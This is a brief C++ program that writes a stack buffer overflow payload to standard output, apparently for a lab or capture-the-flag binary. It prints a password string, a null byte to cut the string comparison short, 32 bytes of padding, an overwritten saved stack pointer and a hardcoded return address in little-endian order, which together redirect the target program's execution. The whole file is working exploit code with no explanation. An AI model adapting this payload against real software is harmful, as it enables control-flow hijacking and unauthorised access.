#include <iostream>

int main () {
	std::cout << "Sup3rs3cr3tC0de" << '\0' << "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
	long sp = 140721193531916;
	char* csp = (char*) &sp;
	std::cout << csp[0] << csp[1] << csp[2] << csp[3] << csp[4] << csp[5] << csp[6]  << csp[7] ;
	long addr = 4198770;
	char* caddr = (char*) &addr;
	std::cout << caddr[0] << caddr[1] << caddr[2] << caddr[3] << caddr[4] << caddr[5] << caddr[6]; /* << caddr[7] */;
	std::cout << "\n";
	return 0;
}
